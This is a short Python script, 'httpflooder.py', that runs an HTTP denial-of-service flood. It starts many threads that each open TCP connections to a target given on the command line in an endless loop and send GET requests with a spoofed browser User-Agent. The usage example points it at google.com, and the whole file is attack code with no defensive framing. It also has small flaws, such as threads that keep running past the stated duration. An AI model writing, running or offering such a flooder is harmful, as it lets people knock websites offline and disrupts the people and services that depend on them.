import socket, sys
from threading import Thread
from time import sleep


class Flood(Thread):
    def __init__(self, host, port):
        """Инициализация потока"""
        Thread.__init__(self)
        self.host = host
        self.port = port

    def run(self):
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(request.encode())
            s.close()

if len(sys.argv) < 5:
    print("USAGE: python httpflooder.py [HOST] [PORT] [THREADS] [DURATION]"
          "\nEXAMPLE: python httpflooder.py http://google.com 80 10 5")
    exit(0)

host_arr = sys.argv[1].split("/")
port = int(sys.argv[2])
threads = int(sys.argv[3])
duration = int(sys.argv[4])
host = host_arr[2]
url = ''
i = 3
while i < len(host_arr):
    url += host_arr[i] + "/"
    i += 1
url = url.replace("//", "/")

print("HOST: " + host + "\nURL: " + url + "\nTHREADS: " + str(threads) + "\n----------------\nSTARTING")

request = "GET /" + url + " HTTP/1.1\r\n" \
                   "Host: " + host + "\r\n"\
                   "Connection: close\r\n" \
                   "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.3) " \
                                     "Gecko/20070309 Firefox/2.0.0.3\r\n" \
                   "Referer: http://google.ncom/\r\n" \
                   "\r\n"

for i in range(threads):
    Flood(host, port).start()
    print("THREAD [" + str(i) + "] INITIALIZED")

print("ALL THREADS ARE INITIALIZED")
sleep(duration * 60)
